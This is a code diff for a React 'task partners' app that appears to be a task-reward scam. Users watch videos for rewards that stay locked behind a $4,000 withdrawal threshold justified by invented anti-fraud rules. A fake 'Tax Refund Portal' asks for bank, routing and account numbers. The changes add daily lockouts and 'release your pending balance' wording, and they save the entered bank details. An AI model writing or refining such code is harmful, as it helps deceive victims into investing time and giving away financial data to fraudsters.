@@ -7,6 +7,8 @@ import {
   Loader2,
   LockKeyhole,
   LockKeyholeIcon,
+  Pause,
+  Play,
   ReceiptText,
   Search,
   Star,
@@ -16,7 +18,7 @@ import {
   Wallet,
 } from "lucide-react";
 import type { FormEvent, ReactNode } from "react";
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 
 export const Route = createFileRoute("/tasks-app")({
   head: () => ({
@@ -51,14 +53,15 @@ const TOTAL_REWARD_TO_GOAL = MIN_WITHDRAWAL - INITIAL_BALANCE;
 const ACCOUNTS_KEY = "ttp_accounts";
 const SESSION_KEY = "ttp_session";
 const APP_STATE_KEY = "ttp_app_state";
+const REFUND_STATE_KEY = "ttp_refund_state";
 
 const videoPool = [
-  { creator: "MrBeast", title: "Challenge Audit", videoUrl: "/videos/task1.mp4" },
-  { creator: "Zach King", title: "Illusion Review", videoUrl: "/videos/task2.mp4" },
-  { creator: "US Creator Network", title: "Satisfying ASMR Audit", videoUrl: "/videos/task3.mp4" },
-  { creator: "Viral Audio Lab", title: "Viral Audio Audit", videoUrl: "/videos/task4.mp4" },
-  { creator: "Creator Metrics", title: "Engagement Review", videoUrl: "/videos/task5.mp4" },
-  { creator: "Retention Studio", title: "Watch Time Quality Check", videoUrl: "/videos/task6.mp4" },
+  { creator: "Viral Creator Content", title: "Challenge Audit", videoUrl: "/videos/task1.mp4" },
+  { creator: "US Trending Video", title: "Illusion Review", videoUrl: "/videos/task2.mp4" },
+  { creator: "Viral Creator Content", title: "Satisfying ASMR Audit", videoUrl: "/videos/task3.mp4" },
+  { creator: "US Trending Video", title: "Viral Audio Audit", videoUrl: "/videos/task4.mp4" },
+  { creator: "Viral Creator Content", title: "Engagement Review", videoUrl: "/videos/task5.mp4" },
+  { creator: "US Trending Video", title: "Watch Time Quality Check", videoUrl: "/videos/task6.mp4" },
 ];
 
 const tasks: VideoTask[] = Array.from({ length: TOTAL_TASKS_TO_GOAL }, (_, index) => {
@@ -70,7 +73,7 @@ const tasks: VideoTask[] = Array.from({ length: TOTAL_TASKS_TO_GOAL }, (_, index
     id: `day-${day}-task-${sequence}`,
     sequence,
     creator: source.creator,
-    title: `Day ${day} - ${source.title}`,
+    title: source.title,
     videoUrl: source.videoUrl,
     reward: rewardForTask(index),
   };
@@ -86,6 +89,7 @@ function TaskPartnersApp() {
   const [user, setUser] = useState<User | null>(null);
   const [authMode, setAuthMode] = useState<AuthMode>("login");
   const [authError, setAuthError] = useState("");
+  const [accountNotFound, setAccountNotFound] = useState(false);
   const [signupName, setSignupName] = useState("");
   const [signupEmail, setSignupEmail] = useState("");
   const [signupPassword, setSignupPassword] = useState("");
@@ -123,7 +127,8 @@ function TaskPartnersApp() {
 
   const task = tasks[Math.min(taskIndex, tasks.length - 1)];
   const taskReviewKey = `${task.id}-${taskIndex}`;
-  const completedToday = (taskIndex % DAILY_LIMIT) + 1;
+  const dailyLimitReached = reviewedIds.length > 0 && reviewedIds.length % DAILY_LIMIT === 0;
+  const completedToday = dailyLimitReached ? DAILY_LIMIT : (taskIndex % DAILY_LIMIT) + 1;
   const reviewUnlocked = progress >= 100 && !reviewedIds.includes(taskReviewKey);
   const hasValidComment = countWords(comment) >= 3;
   const canSubmit = reviewUnlocked && rating > 0 && Boolean(useful) && Boolean(recommend) && hasValidComment;
@@ -146,6 +151,15 @@ function TaskPartnersApp() {
         setReviews(savedState.reviews);
         setReviewedIds(savedState.reviewedIds);
         setTaskIndex(savedState.taskIndex);
+      }
+      const savedRefund = readRefundState(sessionUser.email);
+      if (savedRefund) {
+        setRefundMethod(savedRefund.method);
+        setRefundData(savedRefund.data);
+        setRefundBank(savedRefund.bank);
+        setRefundRouting(savedRefund.routing);
+        setRefundAccount(savedRefund.account);
+        setRefundApproved(savedRefund.approved);
       }
     }
   }, [allowed]);
@@ -177,11 +191,18 @@ function TaskPartnersApp() {
   function login(event: FormEvent<HTMLFormElement>) {
     event.preventDefault();
     setAuthError("");
+    setAccountNotFound(false);
     setLoading(true);
     window.setTimeout(() => {
       const account = readAccounts().find((item) => item.email.toLowerCase() === loginEmail.trim().toLowerCase());
-      if (!account || account.password !== loginPassword) {
-        setAuthError("Invalid email or password.");
+      if (!account) {
+        setAuthError("Account not found. Click here to register your new account.");
+        setAccountNotFound(true);
+        setLoading(false);
+        return;
+      }
+      if (account.password !== loginPassword) {
+        setAuthError("Incorrect credentials. Please try again.");
         setLoading(false);
         return;
       }
@@ -193,6 +214,15 @@ function TaskPartnersApp() {
         setReviewedIds(savedState.reviewedIds);
         setTaskIndex(savedState.taskIndex);
       }
+      const savedRefund = readRefundState(account.email);
+      if (savedRefund) {
+        setRefundMethod(savedRefund.method);
+        setRefundData(savedRefund.data);
+        setRefundBank(savedRefund.bank);
+        setRefundRouting(savedRefund.routing);
+        setRefundAccount(savedRefund.account);
+        setRefundApproved(savedRefund.approved);
+      }
       setLoading(false);
       setScreen("tasks");
       if (remember) window.localStorage.setItem(SESSION_KEY, JSON.stringify(account));
@@ -202,6 +232,7 @@ function TaskPartnersApp() {
   function register(event: FormEvent<HTMLFormElement>) {
     event.preventDefault();
     setAuthError("");
+    setAccountNotFound(false);
     setLoading(true);
     window.setTimeout(() => {
       const email = signupEmail.trim();
@@ -220,6 +251,7 @@ function TaskPartnersApp() {
         JSON.stringify({ balance: INITIAL_BALANCE, reviewedIds: [], reviews: [], taskIndex: 0 }),
       );
       setUser(nextUser);
+      setRefundApproved(false);
       setScreen("tasks");
       setLoading(false);
     }, 700);
@@ -243,7 +275,9 @@ function TaskPartnersApp() {
     setRecommend("");
     setComment("");
     setProgress(0);
-    setTaskIndex((value) => Math.min(value + 1, TOTAL_TASKS_TO_GOAL - 1));
+    if ((completedTask.sequence % DAILY_LIMIT) !== 0) {
+      setTaskIndex((value) => Math.min(value + 1, TOTAL_TASKS_TO_GOAL - 1));
+    }
 
     setProcessing(true);
     setProcessingStep(0);
@@ -263,6 +297,19 @@ function TaskPartnersApp() {
   function requestRefund(event: FormEvent<HTMLFormElement>) {
     event.preventDefault();
     setRefundLoading(true);
+    if (user) {
+      window.localStorage.setItem(
+        refundStateKey(user.email),
+        JSON.stringify({
+          account: refundAccount,
+          approved: true,
+          bank: refundBank,
+          data: refundData,
+          method: refundMethod,
+          routing: refundRouting,
+        }),
+      );
+    }
     window.setTimeout(() => {
       setRefundLoading(false);
       setRefundApproved(true);
@@ -288,7 +335,24 @@ function TaskPartnersApp() {
             <p className="mx-auto mt-3 max-w-[330px] text-center text-sm leading-6 text-[#475569]">
               Sign in or create your reviewer account to unlock premium video audit tasks.
             </p>
-            {authError && <div className="mt-5 rounded-[8px] border border-rose-200 bg-rose-50 px-4 py-3 text-sm font-black text-rose-600">{authError}</div>}
+            {authError && (
+              <div className="mt-5 rounded-[8px] border border-rose-200 bg-rose-50 px-4 py-3 text-sm font-black text-rose-600">
+                {accountNotFound ? (
+                  <button
+                    className="text-left underline decoration-2 underline-offset-2"
+                    onClick={() => {
+                      setSignupEmail(loginEmail);
+                      setAuthError("");
+                      setAccountNotFound(false);
+                      setAuthMode("register");
+                    }}
+                    type="button"
+                  >
+                    {authError}
+                  </button>
+                ) : authError}
+              </div>
+            )}
             <form onSubmit={authMode === "login" ? login : register} className="mt-8 space-y-3">
               {authMode === "register" && <AuthInput icon={<UserRound size={18} />} onChange={setSignupName} placeholder="Full Name" type="text" value={signupName} />}
               <AuthInput
@@ -344,9 +408,12 @@ function TaskPartnersApp() {
             <div className="shrink-0 rounded-[8px] bg-[#F1F5F9] px-3 py-2 text-right">
               <p className="text-[10px] font-black uppercase tracking-[0.14em] text-[#475569]">Daily Tasks</p>
               <p className="text-lg font-black text-[#FE2C55]">{Math.min(completedToday, DAILY_LIMIT)}/{DAILY_LIMIT}</p>
-              <p className="text-[10px] font-black text-[#475569]">Day {task.day}/7</p>
+              <p className="text-[10px] font-black text-[#475569]">Partner audits</p>
             </div>
           </div>
+          <p className="mt-3 text-[11px] font-bold leading-4 text-[#475569]">
+            Review partner creators to unlock and release the remaining pending withdrawal balance.
+          </p>
         </header>
 
         <div className="min-h-0 flex-1 overflow-y-auto px-4 pb-28 pt-4">
@@ -354,6 +421,7 @@ function TaskPartnersApp() {
             <TasksScreen
               canSubmit={canSubmit}
               comment={comment}
+              dailyLimitReached={dailyLimitReached}
               hasValidComment={hasValidComment}
               isMuted={isMuted}
               progress={progress}
@@ -424,6 +492,7 @@ function TaskPartnersApp() {
 function TasksScreen(props: {
   canSubmit: boolean;
   comment: string;
+  dailyLimitReached: boolean;
   hasValidComment: boolean;
   isMuted: boolean;
   progress: number;
@@ -441,8 +510,39 @@ function TasksScreen(props: {
   taskIndex: number;
   useful: string;
 }) {
+  const videoRef = useRef<HTMLVideoElement | null>(null);
+  const [isPlaying, setIsPlaying] = useState(true);
   const dayEndIndex = props.task.day * DAILY_LIMIT;
   const lockedTasks = tasks.slice(props.taskIndex + 1, dayEndIndex);
+
+  function togglePlayback() {
+    const video = videoRef.current;
+    if (!video) return;
+    if (video.paused) {
+      void video.play();
+      setIsPlaying(true);
+    } else {
+      video.pause();
+      setIsPlaying(false);
+    }
+  }
+
+  if (props.dailyLimitReached) {
+    return (
+      <div className="space-y-4">
+        <section className="rounded-[8px] border border-rose-200 bg-white p-5 text-center shadow-sm">
+          <div className="mx-auto mb-4 grid h-16 w-16 place-items-center rounded-full bg-[#FE2C55] text-white">
+            <LockKeyholeIcon size={30} />
+          </div>
+          <h1 className="text-2xl font-black text-[#0F172A]">Daily Limit Reached!</h1>
+          <p className="mt-3 text-sm font-bold leading-6 text-[#475569]">
+            To maintain network quality and security, you can only audit 6 videos per day.
+            Please return tomorrow to unlock your remaining pending balance.
+          </p>
+        </section>
+      </div>
+    );
+  }
 
   return (
     <div className="space-y-4">
@@ -451,16 +551,22 @@ function TasksScreen(props: {
           <div className="min-w-0">
             <p className="text-xs font-black text-[#FE2C55]">{props.task.creator}</p>
             <h1 className="text-xl font-black leading-tight text-[#0F172A]">{props.task.title}</h1>
-            <p className="mt-1 text-xs font-semibold text-[#475569]">Day {props.task.day} · Task {props.task.sequence}/6 · Reward: {brl(props.task.reward)}</p>
+            <p className="mt-1 text-xs font-semibold text-[#475569]">Task {props.task.sequence}/6 - Reward: {brl(props.task.reward)}</p>
+            <p className="mt-2 text-xs font-bold leading-5 text-[#475569]">
+              Evaluate partner creator content to release your remaining pending withdrawal balance.
+            </p>
           </div>
         </div>
-        <div className="relative aspect-[9/14] max-h-[390px] w-full overflow-hidden rounded-[8px] bg-slate-950">
+        <div className="relative aspect-[9/16] max-h-[448px] w-full overflow-hidden rounded-[8px] bg-slate-950">
           <video
+            ref={videoRef}
             key={props.task.id}
             autoPlay
             className="h-full w-full object-cover"
             muted={props.isMuted}
             onEnded={() => props.setProgress(100)}
+            onPause={() => setIsPlaying(false)}
+            onPlay={() => setIsPlaying(true)}
             onTimeUpdate={(event) => {
               const video = event.currentTarget;
               if (!Number.isFinite(video.duration) || video.duration <= 0) return;
@@ -470,6 +576,15 @@ function TasksScreen(props: {
             preload="auto"
             src={props.task.videoUrl}
           />
+          <button
+            aria-label={isPlaying ? "Pause video" : "Play video"}
+            className="absolute left-3 top-3 grid h-10 w-10 place-items-center rounded-full bg-black/55 text-white backdrop-blur"
+            onClick={togglePlayback}
+            onMouseDown={(event) => event.preventDefault()}
+            type="button"
+          >
+            {isPlaying ? <Pause size={18} /> : <Play size={18} fill="currentColor" />}
+          </button>
           <button
             className="absolute right-3 top-3 grid h-10 w-10 place-items-center rounded-full bg-black/55 text-white backdrop-blur"
             onClick={() => props.setIsMuted(!props.isMuted)}
@@ -483,7 +598,7 @@ function TasksScreen(props: {
 
       <section className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
         <div className="mb-2 flex items-center justify-between text-xs font-black text-[#475569]">
-          <span>⚠️ Finish watching the video to unlock the review. ({Math.round(props.progress)}%)</span>
+          <span>Finish watching the video to unlock the creator review. ({Math.round(props.progress)}%)</span>
         </div>
         <div className="h-3 overflow-hidden rounded-full bg-slate-200">
           <div className="h-full rounded-full bg-[#FE2C55] transition-all duration-500" style={{ width: `${props.progress}%` }} />
@@ -497,7 +612,7 @@ function TasksScreen(props: {
               <LockKeyholeIcon size={30} />
             </div>
             <h2 className="text-xl font-black text-[#0F172A]">Review Locked</h2>
-            <p className="mt-2 max-w-[280px] text-sm leading-6 text-[#475569]">Complete task requirements above to unlock questions.</p>
+            <p className="mt-2 max-w-[280px] text-sm leading-6 text-[#475569]">Finish the partner creator audit above to unlock the questions and release pending withdrawal funds.</p>
           </div>
         ) : (
           <div className="space-y-4">
@@ -518,15 +633,15 @@ function TasksScreen(props: {
               <textarea
                 className="min-h-28 w-full resize-none rounded-[8px] border border-slate-200 bg-white px-3 py-3 text-sm font-semibold text-[#0F172A] outline-none placeholder:text-slate-400 focus:border-[#2563EB]"
                 onChange={(event) => props.setComment(event.target.value)}
-                placeholder="Write at least 15 characters..."
+                placeholder="Write at least 3 real words..."
                 value={props.comment}
               />
               {!props.hasValidComment && (
-                <span className="mt-1.5 block text-xs font-bold text-[#FE2C55]">⚠️ Your comment must contain at least 3 words.</span>
+                <span className="mt-1.5 block text-xs font-bold text-[#FE2C55]">Warning: Your comment must contain at least 3 words.</span>
               )}
             </label>
             <button className="min-h-13 w-full rounded-[8px] bg-[#FE2C55] px-4 py-3 text-sm font-black text-white shadow-lg shadow-rose-200 transition active:scale-[0.98] disabled:bg-slate-300 disabled:text-slate-500 disabled:shadow-none" disabled={!props.canSubmit} onClick={props.submitReview} type="button">
-              Submit Review & Claim Reward
+              Submit Creator Review & Release Balance
             </button>
           </div>
         )}
@@ -535,7 +650,7 @@ function TasksScreen(props: {
       <section className="space-y-3">
         <div>
           <h2 className="text-lg font-black text-[#0F172A]">Pending Reviews</h2>
-          <p className="text-xs font-semibold text-[#475569]">Complete the current review to unlock the next task in your daily queue.</p>
+          <p className="text-xs font-semibold text-[#475569]">Complete the current creator audit to unlock the next partner review.</p>
         </div>
         {lockedTasks.map((lockedTask, index) => (
           <div className="relative overflow-hidden rounded-[8px] border border-slate-200 bg-white p-3 shadow-sm" key={`${lockedTask.id}-${index}`}>
@@ -544,7 +659,7 @@ function TasksScreen(props: {
               <div className="min-w-0">
                 <p className="truncate text-xs font-black text-[#FE2C55]">{lockedTask.creator}</p>
                 <p className="truncate text-sm font-black text-[#0F172A]">{lockedTask.title}</p>
-                <p className="text-xs font-semibold text-[#475569]">Day {lockedTask.day} · {brl(lockedTask.reward)} reward</p>
+                <p className="text-xs font-semibold text-[#475569]">{brl(lockedTask.reward)} release value</p>
               </div>
             </div>
             <div className="absolute inset-0 grid place-items-center bg-white/45 backdrop-blur-sm">
@@ -601,8 +716,17 @@ function WalletScreen(props: {
           setData={props.setPaymentData}
           setRouting={props.setPaymentRouting}
         />
+        {!canWithdraw && (
+          <div className="mt-3 rounded-[8px] border border-amber-200 bg-amber-50 p-3">
+            <p className="text-xs font-bold leading-5 text-amber-800">
+              Due to financial security compliance, anti-fraud regulations, and high-volume transaction processing,
+              the minimum withdrawal threshold for newly activated auditor accounts is strictly set to $4,000.
+              Complete your daily audits to release your pending funds.
+            </p>
+          </div>
+        )}
         <button className="mt-3 min-h-12 w-full rounded-[8px] bg-[#FE2C55] px-4 py-3 text-sm font-black text-white disabled:bg-slate-300 disabled:text-slate-500" disabled={!canWithdraw} type="button">
-          {canWithdraw ? "Request Withdrawal" : "You need at least R$ 4.000,00 available before requesting a withdrawal"}
+          {canWithdraw ? "Request Withdrawal" : "Withdrawal Locked"}
         </button>
       </div>
     </div>
@@ -629,12 +753,12 @@ function RefundScreen(props: {
       <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Tax Refund Portal</h1>
       <section className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
         <p className="text-sm leading-6 text-[#475569]">
-          ✅ Tax Refund Pending: A fee of R$ 37.12 linked to your ID is eligible for instant refund. This will be deposited into your account in less than 24 hours. Enter your payout details below.
+          Tax Refund Pending: A fee of R$ 37.12 linked to your ID is eligible for instant refund. This will be deposited into your account in less than 24 hours. Enter your payout details below.
         </p>
         {props.approved ? (
           <div className="mt-5 rounded-[8px] border border-emerald-200 bg-emerald-50 p-4">
             <p className="text-sm font-black text-emerald-700">
-              Status: Processing... Your refund of R$ 37,12 has been approved and will be credited to your account in less than 24 hours.
+              Status: Processing... Your refund of R$ 37,12 is being processed and will be credited to your selected account within 24 hours.
             </p>
           </div>
         ) : (
@@ -655,7 +779,7 @@ function RefundScreen(props: {
             />
             <button className="flex min-h-12 w-full items-center justify-center gap-2 rounded-[8px] bg-[#2563EB] px-4 py-3 text-sm font-black text-white disabled:bg-slate-300" disabled={props.loading} type="submit">
               {props.loading && <Loader2 className="animate-spin" size={18} />}
-              Request Instant Refund
+              Confirm & Register Details
             </button>
           </form>
         )}
@@ -912,4 +1036,26 @@ function readAppState(email: string): { balance: number; reviewedIds: string[]; 
 
 function appStateKey(email: string) {
   return `${APP_STATE_KEY}:${email.toLowerCase()}`;
+}
+
+type RefundState = {
+  account: string;
+  approved: boolean;
+  bank: string;
+  data: string;
+  method: string;
+  routing: string;
+};
+
+function readRefundState(email: string): RefundState | null {
+  try {
+    const raw = window.localStorage.getItem(refundStateKey(email));
+    return raw ? (JSON.parse(raw) as RefundState) : null;
+  } catch {
+    return null;
+  }
+}
+
+function refundStateKey(email: string) {
+  return `${REFUND_STATE_KEY}:${email.toLowerCase()}`;
 }
